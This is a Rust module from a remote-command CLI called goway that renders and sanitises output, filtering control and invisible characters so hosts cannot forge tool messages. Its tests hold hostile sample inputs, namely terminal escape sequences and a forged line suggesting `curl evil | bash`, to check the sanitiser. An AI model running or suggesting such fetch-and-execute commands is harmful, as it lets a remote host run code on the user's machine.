//! The one module that prints. Everything goway itself says goes through a
//! [`Renderer`]; the streamed output of remote commands is only written
//! here as bytes (after the terminal filter when the stream is a terminal).
//!
//! Status lines, warnings and errors go to stderr so stdout stays clean for
//! machine-readable output and for the remote command's own stdout. Every
//! line names its kind in words (`error:`, `warning:`, `failed:`, `note:`,
//! `done:`, `info:`, `next:`), so color is never the only signal.
#![allow(clippy::print_stdout, clippy::print_stderr, clippy::disallowed_macros)]

use std::fmt::{Display, Write as _};
use std::io::Write as _;
use std::sync::Mutex;

use anstream::{AutoStream, ColorChoice};
use anstyle::{AnsiColor, Style};

use crate::error::Error;

const ERROR: Style = AnsiColor::Red.on_default().bold();
const WARN: Style = AnsiColor::Yellow.on_default().bold();
const GOOD: Style = AnsiColor::Green.on_default().bold();
const ACCENT: Style = AnsiColor::Cyan.on_default().bold();
const DIM: Style = Style::new().dimmed();

/// When to color output, as chosen with `--color`.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, clap::ValueEnum)]
pub enum ColorWhen {
    /// Color when the stream is a terminal and `NO_COLOR` is unset.
    #[default]
    Auto,
    /// Always color.
    Always,
    /// Never color.
    Never,
}

/// Prints goway's own messages with consistent styling.
#[derive(Debug, Clone, Copy)]
pub struct Renderer {
    choice: ColorChoice,
    /// Tables as labelled lines (`--plain`, `GOWAY_PLAIN=1`): screen
    /// readers read "host: helios, load: 0.40" instead of bare columns.
    plain: bool,
}

impl Renderer {
    /// Build a renderer honouring `--color` (and `NO_COLOR` under `auto`).
    pub fn new(when: ColorWhen) -> Self {
        let choice = match when {
            ColorWhen::Auto => ColorChoice::Auto,
            ColorWhen::Always => ColorChoice::Always,
            ColorWhen::Never => ColorChoice::Never,
        };
        Self {
            choice,
            plain: std::env::var_os("GOWAY_PLAIN").is_some_and(|v| !v.is_empty() && v != "0"),
        }
    }

    /// Render tables as labelled lines instead of columns.
    #[must_use]
    pub fn with_plain(mut self, plain: bool) -> Self {
        self.plain |= plain;
        self
    }

    /// Write `text` to goway's stderr (colors stripped when not coloring)
    /// as one unit under the global output lock.
    fn emit_err(self, text: &str) {
        let _guard = lock_output();
        let mut stream = AutoStream::new(std::io::stderr().lock(), self.choice);
        let _ = stream.write_all(text.as_bytes());
        let _ = stream.flush();
    }

    /// Like [`Self::emit_err`] for stdout.
    fn emit_out(self, text: &str) {
        let _guard = lock_output();
        let mut stream = AutoStream::new(std::io::stdout().lock(), self.choice);
        let _ = stream.write_all(text.as_bytes());
        let _ = stream.flush();
    }

    /// One styled `goway: <label>:` line on stderr, assembled whole.
    fn tagged(self, style: Style, label: &str, message: &dyn Display) {
        self.emit_err(&tagged_text(style, label, message));
    }

    /// Report a goway failure on stderr.
    pub fn error(self, error: &Error) {
        self.tagged(ERROR, "error", &error);
    }

    /// Report a non-fatal problem on stderr.
    pub fn warn(self, message: impl Display) {
        self.tagged(WARN, "warning", &message);
    }

    /// A progress or status note on stderr.
    pub fn note(self, message: impl Display) {
        self.tagged(DIM, "note", &message);
    }

    /// A success line on stderr.
    pub fn ok(self, message: impl Display) {
        self.tagged(GOOD, "done", &message);
    }

    /// An accented headline on stderr, such as where a run is going.
    pub fn headline(self, message: impl Display) {
        self.tagged(ACCENT, "info", &message);
    }

    /// A command that ran but failed (not a goway error), on stderr.
    pub fn failed(self, message: impl Display) {
        self.tagged(WARN, "failed", &message);
    }

    /// What the user should do next, on stderr.
    pub fn next(self, message: impl Display) {
        self.tagged(ACCENT, "next", &message);
    }

    /// A line of primary output on stdout (tables, paths, lists).
    pub fn line(self, message: impl Display) {
        let message = clean(&message.to_string());
        self.emit_out(&format!("{message}\n"));
    }

    /// Render rows as an aligned table on stdout; the first row is the header.
    pub fn table(self, rows: &[Vec<String>]) {
        let rows: Vec<Vec<String>> = rows
            .iter()
            .map(|r| r.iter().map(|c| clean(c)).collect())
            .collect();
        let mut text = String::new();
        if self.plain {
            for line in plain_table(&rows) {
                let _ = writeln!(text, "{line}");
            }
        } else {
            for (i, row) in format_table(&rows).iter().enumerate() {
                let _ = if i == 0 {
                    writeln!(text, "{ACCENT}{row}{ACCENT:#}")
                } else {
                    writeln!(text, "{row}")
                };
            }
        }
        self.emit_out(&text);
    }
}

/// One whole message line, styled, cleaned and newline-terminated, ready for a single write.
fn tagged_text(style: Style, label: &str, message: &dyn Display) -> String {
    let message = clean(&message.to_string());
    format!("{style}goway: {label}:{style:#} {message}\n")
}

/// Most characters of one host-derived message goway prints.
const MAX_MESSAGE_CHARS: usize = 4096;
/// Starts every continuation line of a multi-line message, so a line made
/// up by a host can never begin with `goway:` and pass for goway's own.
const CONTINUATION: &str = "\n  | ";

/// Whether `c` is invisible or reorders text (zero-width and bidi format
/// characters, BOM, word joiner and friends) and so can disguise content.
fn is_format_char(c: char) -> bool {
    matches!(
        c,
        '\u{200b}'..='\u{200f}'
            | '\u{202a}'..='\u{202e}'
            | '\u{2060}'..='\u{2064}'
            | '\u{2066}'..='\u{206f}'
            | '\u{061c}'
            | '\u{180e}'
            | '\u{feff}'
            | '\u{fff9}'..='\u{fffb}'
    )
}

/// Text goway prints itself may carry data from a host (hostnames, paths,
/// ssh errors). Control and invisible format characters are replaced, so a
/// host cannot move the cursor, rewrite the screen, set the window title or
/// reorder text through goway's own lines. Newlines stay but every line
/// after the first is indented under a `  | ` marker, so host text cannot
/// forge a `goway: ...` line, and the length is capped. Tabs stay. The
/// remote command's stream is exempt.
pub fn clean(text: &str) -> String {
    let mut out = String::new();
    let mut count = 0;
    for line in text.lines() {
        if count > 0 {
            out.push_str(CONTINUATION);
        }
        for c in line.chars() {
            count += 1;
            if count > MAX_MESSAGE_CHARS {
                out.push_str(" ... (truncated)");
                return out;
            }
            out.push(if c == '\t' || !(c.is_control() || is_format_char(c)) {
                c
            } else {
                '?'
            });
        }
        count += 1;
    }
    out
}

/// Ask a question on the terminal and read one line of answer; `None`
/// when stdin is not a terminal (scripts must pass flags instead).
pub fn ask(prompt: &str) -> Option<String> {
    use std::io::{BufRead as _, IsTerminal as _, Write as _};
    if !std::io::stdin().is_terminal() {
        return None;
    }
    let mut err = std::io::stderr().lock();
    let _ = write!(err, "goway: {prompt}");
    let _ = err.flush();
    drop(err);
    let mut line = String::new();
    std::io::stdin().lock().read_line(&mut line).ok()?;
    Some(line)
}

/// The one lock every writer takes (goway's messages, prefixed lines,
/// pass-through bytes), so no write from one stream can land inside another.
static OUTPUT: Mutex<()> = Mutex::new(());

/// Take the global output lock; a panic in another writer must not silence output.
fn lock_output() -> std::sync::MutexGuard<'static, ()> {
    OUTPUT.lock().unwrap_or_else(std::sync::PoisonError::into_inner)
}

/// Write `bytes` to `sink` as one unit under the global output lock, then flush.
pub fn write_locked(sink: &mut impl std::io::Write, bytes: &[u8]) {
    let _guard = lock_output();
    if let Err(e) = sink.write_all(bytes).and_then(|()| sink.flush()) {
        tracing::debug!(error = %e, "output write failed");
    }
}

/// Write `bytes` of remote output to our stdout or stderr (one locked write, flushed).
fn write_stream(to_stderr: bool, bytes: &[u8]) {
    if bytes.is_empty() {
        return;
    }
    if to_stderr {
        write_locked(&mut std::io::stderr().lock(), bytes);
    } else {
        write_locked(&mut std::io::stdout().lock(), bytes);
    }
}

/// Longest line (bytes, prefix excluded) relayed whole; longer lines are
/// split, each continuation starting with the `[host]+ ` prefix.
pub const MAX_LINE: usize = 64 * 1024;

/// Turns a stream of remote bytes into prefixed lines: each line (or
/// 64 KiB piece of a longer one) is prefixed and complete, so a batch can
/// be written in one call. Holds at most one partial line (bounded).
#[derive(Debug)]
pub struct LineFramer {
    prefix: String,
    cont_prefix: String,
    pending: Vec<u8>,
    continued: bool,
}

/// Where to cut `bytes` (at most 3 bytes may be an unfinished UTF-8 tail) so no character is split.
fn char_safe_cut(bytes: &[u8]) -> usize {
    let len = bytes.len();
    for back in 1..=len.min(4) {
        let b = bytes[len - back];
        if b & 0xC0 == 0x80 {
            continue; // continuation byte: keep looking for its lead
        }
        let need = match b {
            0xF0..=0xF7 => 4,
            0xE0..=0xEF => 3,
            0xC0..=0xDF => 2,
            _ => 1,
        };
        return if need > back { len - back } else { len };
    }
    len
}

impl LineFramer {
    /// A framer prefixing lines with `prefix` (such as `[helios] `).
    pub fn new(prefix: &str) -> Self {
        let cont_prefix = match prefix.strip_suffix("] ") {
            Some(head) => format!("{head}]+ "),
            None => format!("{prefix}+ "),
        };
        Self {
            prefix: prefix.to_owned(),
            cont_prefix,
            pending: Vec::new(),
            continued: false,
        }
    }

    fn emit(&self, piece: &[u8], out: &mut Vec<u8>) {
        let prefix = if self.continued { &self.cont_prefix } else { &self.prefix };
        out.extend_from_slice(prefix.as_bytes());
        out.extend_from_slice(piece);
    }

    /// Frame `data` into `out`: every completed line (and every full 64 KiB
    /// piece) is appended; the trailing partial line is kept for the next call.
    pub fn push(&mut self, mut data: &[u8], out: &mut Vec<u8>) {
        while !data.is_empty() {
            let room = MAX_LINE - self.pending.len();
            let window = &data[..data.len().min(room)];
            if let Some(i) = window.iter().position(|&b| b == b'\n') {
                self.pending.extend_from_slice(&window[..=i]);
                let line = std::mem::take(&mut self.pending);
                self.emit(&line, out);
                self.continued = false;
                data = &data[i + 1..];
            } else {
                self.pending.extend_from_slice(window);
                data = &data[window.len()..];
                if self.pending.len() >= MAX_LINE {
                    let cut = char_safe_cut(&self.pending);
                    let rest = self.pending.split_off(cut);
                    let piece = std::mem::replace(&mut self.pending, rest);
                    self.emit(&piece, out);
                    out.push(b'\n');
                    self.continued = true;
                }
            }
        }
    }

    /// End of stream: terminate a partial last line so the next writer starts fresh.
    pub fn finish(&mut self, out: &mut Vec<u8>) {
        if !self.pending.is_empty() {
            let line = std::mem::take(&mut self.pending);
            self.emit(&line, out);
            out.push(b'\n');
            self.continued = false;
        }
    }
}

/// Write a batch of already-framed lines of a remote command's output to
/// our stdout or stderr: one write under the global lock.
pub fn prefixed_batch(to_stderr: bool, framed: &[u8]) {
    write_stream(to_stderr, framed);
}

/// Write already-filtered bytes of a remote command's output to our stdout
/// or stderr and flush, so a prompt without a newline appears at once.
pub fn passthrough(to_stderr: bool, bytes: &[u8]) {
    write_stream(to_stderr, bytes);
}

/// One line per data row of "label: value" pairs (empty cells and "-"
/// skipped); pure so it can be tested.
pub fn plain_table(rows: &[Vec<String>]) -> Vec<String> {
    let Some((header, data)) = rows.split_first() else {
        return Vec::new();
    };
    data.iter()
        .map(|row| {
            row.iter()
                .enumerate()
                .filter(|(_, v)| !v.trim().is_empty() && v.trim() != "-")
                .map(|(i, v)| match header.get(i) {
                    Some(label) if !label.is_empty() => format!("{label}: {}", v.trim()),
                    _ => v.trim().to_owned(),
                })
                .collect::<Vec<_>>()
                .join(", ")
        })
        .collect()
}

/// Pad cells so columns line up; pure so it can be tested.
pub fn format_table(rows: &[Vec<String>]) -> Vec<String> {
    let columns = rows.iter().map(Vec::len).max().unwrap_or(0);
    let widths: Vec<usize> = (0..columns)
        .map(|c| {
            rows.iter()
                .filter_map(|r| r.get(c))
                .map(|s| s.chars().count())
                .max()
                .unwrap_or(0)
        })
        .collect();
    rows.iter()
        .map(|row| {
            let cells: Vec<String> = row
                .iter()
                .enumerate()
                .map(|(c, cell)| format!("{cell:<width$}", width = widths[c]))
                .collect();
            cells.join("  ").trim_end().to_owned()
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    // frob:tests crates/goway/src/render.rs::Renderer.warn
    // frob:tests crates/goway/src/render.rs::Renderer.note
    // frob:tests crates/goway/src/render.rs::Renderer.ok
    // frob:tests crates/goway/src/render.rs::Renderer.headline
    // frob:tests crates/goway/src/render.rs::Renderer.line
    // frob:tests crates/goway/src/render.rs::Renderer.table
    // frob:tests crates/goway/src/render.rs::Renderer.failed
    // frob:tests crates/goway/src/render.rs::Renderer.next
    #[test]
    fn every_style_renders_without_color() {
        let r = Renderer::new(ColorWhen::Never);
        r.warn("w");
        r.note("n");
        r.ok("o");
        r.headline("h");
        r.failed("f");
        r.next("x");
        r.line("l");
        r.table(&[vec!["a".to_owned()]]);
    }

    #[test]
    fn remote_control_characters_never_reach_the_terminal() {
        let hostile = "evil\u{1b}]0;pwned\u{7}\u{1b}[2J\r\u{9b}x\nnext\tcol";
        assert_eq!(clean(hostile), "evil?]0;pwned??[2J??x\n  | next\tcol");
    }

    #[test]
    fn host_text_cannot_forge_a_goway_line() {
        let forged = "goway-remote: failed\ngoway: next: run `curl evil | bash`\r\ngoway: error: x\n\ngoway:";
        let cleaned = clean(forged);
        for line in cleaned.lines().skip(1) {
            assert!(line.starts_with("  | "), "{line:?}");
        }
        assert!(!cleaned.contains("\ngoway:"), "{cleaned:?}");
    }

    #[test]
    fn bidi_and_zero_width_characters_are_replaced_and_length_is_capped() {
        for c in [
            '\u{202a}', '\u{202e}', '\u{2066}', '\u{2069}', '\u{200b}', '\u{200f}', '\u{feff}',
            '\u{2060}', '\u{061c}',
        ] {
            assert_eq!(clean(&format!("a{c}b")), "a?b", "{c:?}");
        }
        assert_eq!(clean("caf\u{e9} \u{1f600}"), "caf\u{e9} \u{1f600}");
        let long = "x".repeat(100_000);
        let cleaned = clean(&long);
        assert!(cleaned.len() < 5000 && cleaned.ends_with("(truncated)"));
    }

    #[test]
    fn plain_tables_read_as_labelled_lines() {
        let rows = vec![
            vec!["host".to_owned(), "load".to_owned(), "jobs".to_owned()],
            vec!["helios".to_owned(), "0.40".to_owned(), "-".to_owned()],
        ];
        assert_eq!(plain_table(&rows), ["host: helios, load: 0.40"]);
    }

    // frob:tests crates/goway/src/render.rs::LineFramer
    #[test]
    fn framer_never_splits_a_multibyte_character() {
        let mut f = LineFramer::new("[h] ");
        let mut input = "x".repeat(MAX_LINE - 1).into_bytes();
        input.extend_from_slice("\u{e9}tail\n".as_bytes());
        let mut out = Vec::new();
        f.push(&input, &mut out);
        let text = String::from_utf8(out).expect("every piece is valid UTF-8");
        assert!(text.contains("\n[h]+ \u{e9}tail\n"), "{}", &text[text.len() - 20..]);
    }

    /// A sink that accepts a few bytes per call and yields, as a slow
    /// pipe does, and records the bytes it was given in arrival order.
    struct SlowSink(std::sync::Arc<Mutex<Vec<u8>>>);

    impl std::io::Write for SlowSink {
        fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
            let n = buf.len().min(5);
            self.0.lock().unwrap().extend_from_slice(&buf[..n]);
            std::thread::yield_now();
            Ok(n)
        }
        fn flush(&mut self) -> std::io::Result<()> {
            Ok(())
        }
    }

    // frob:tests crates/goway/src/render.rs::write_locked
    // frob:tests crates/goway/src/render.rs::prefixed_batch
    // frob:tests crates/goway/src/render.rs::LineFramer
    #[test]
    fn many_writers_never_split_or_interleave_a_line() {
        let sink = std::sync::Arc::new(Mutex::new(Vec::new()));
        std::thread::scope(|s| {
            for w in 0..8u8 {
                let sink = sink.clone();
                s.spawn(move || {
                    let mut sink = SlowSink(sink);
                    let mut lines = LineFramer::new(&format!("[w{w}] "));
                    for n in 0..200 {
                        let mut framed = Vec::new();
                        if n % 3 == 0 {
                            // goway's own message shape, one buffer
                            framed.extend_from_slice(format!("goway: note: {w} {n}\n").as_bytes());
                        } else {
                            lines.push(format!("line {n} from {w}\nand more {n}\n").as_bytes(), &mut framed);
                        }
                        write_locked(&mut sink, &framed);
                    }
                });
            }
        });
        let bytes = sink.lock().unwrap().clone();
        let text = String::from_utf8(bytes).unwrap();
        let mut count = 0;
        for line in text.lines() {
            count += 1;
            let ok = (line.starts_with("goway: note: ") && line.split(' ').count() == 4)
                || (line.starts_with("[w") && (line.contains("] line ") || line.contains("] and more ")));
            assert!(ok, "torn or interleaved line: {line:?}");
        }
        assert_eq!(count, 8 * (67 + 133 * 2));
    }

    // frob:tests crates/goway/src/render.rs::Renderer.warn
    // frob:tests crates/goway/src/render.rs::Renderer.error
    #[test]
    fn a_message_is_one_whole_buffer_with_one_trailing_newline() {
        let text = tagged_text(WARN, "warning", &"two\nlines\r\nhere");
        assert_eq!(text.matches('\n').count(), 3, "{text:?}");
        assert!(text.ends_with("here\n"));
        assert!(text.starts_with(&format!("{WARN}goway: warning:")));
        // multi-line host text is indented so it cannot pass for a goway line
        assert!(text.contains("\n  | lines"));
    }

    #[test]
    fn table_columns_align() {
        let rows = vec![
            vec!["host".to_owned(), "load".to_owned()],
            vec!["helios".to_owned(), "0.1".to_owned()],
        ];
        assert_eq!(format_table(&rows), vec!["host    load", "helios  0.1"]);
    }
}
